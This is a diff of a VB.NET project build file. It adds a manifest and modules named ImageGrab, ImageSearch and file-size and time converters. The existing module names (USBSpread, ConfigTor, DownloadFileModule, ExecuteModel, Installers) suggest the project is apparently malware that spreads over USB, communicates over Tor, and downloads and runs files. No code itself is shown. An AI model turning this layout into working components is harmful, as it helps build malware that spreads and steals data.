@@ -14,6 +14,7 @@
     <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
     <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
     <Deterministic>true</Deterministic>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
     <PublishUrl>publish\</PublishUrl>
     <Install>true</Install>
     <InstallFrom>Disk</InstallFrom>
@@ -26,7 +27,6 @@
     <MapFileExtensions>true</MapFileExtensions>
     <ApplicationRevision>0</ApplicationRevision>
     <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
-    <IsWebBootstrapper>false</IsWebBootstrapper>
     <UseApplicationTrust>false</UseApplicationTrust>
     <BootstrapperEnabled>true</BootstrapperEnabled>
   </PropertyGroup>
@@ -61,6 +61,9 @@
   </PropertyGroup>
   <PropertyGroup>
     <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>My Project\app.manifest</ApplicationManifest>
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="Newtonsoft.Json, Version=12.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
@@ -112,13 +115,17 @@
     <Compile Include="Models\DefaultRegistrationModel.vb" />
     <Compile Include="Models\ExecuteModel.vb" />
     <Compile Include="Models\IpInfo.vb" />
+    <Compile Include="Moduls\Converter\FileSize.vb" />
+    <Compile Include="Moduls\Converter\TimeConverter.vb" />
     <Compile Include="Moduls\Details\CommunicationDetails.vb" />
     <Compile Include="Moduls\Details\Details.vb" />
+    <Compile Include="Moduls\Grabs\ImageGrab.vb" />
     <Compile Include="Moduls\Installers\CopyModule.vb" />
     <Compile Include="Moduls\Installers\Installing.vb" />
     <Compile Include="Moduls\IO\UnZIPModule.vb" />
     <Compile Include="Moduls\Network\DownloadFileModule.vb" />
     <Compile Include="Moduls\Network\StreamWrite.vb" />
+    <Compile Include="Moduls\Search\ImageSearch.vb" />
     <Compile Include="Moduls\Spreads\USBSpread.vb" />
     <Compile Include="Moduls\Tor\ConfigTor.vb" />
     <Compile Include="Moduls\IO\GetPathes.vb" />
@@ -150,6 +157,7 @@
     </EmbeddedResource>
   </ItemGroup>
   <ItemGroup>
+    <None Include="My Project\app.manifest" />
     <None Include="My Project\Application.myapp">
       <Generator>MyApplicationCodeGenerator</Generator>
       <LastGenOutput>Application.Designer.vb</LastGenOutput>
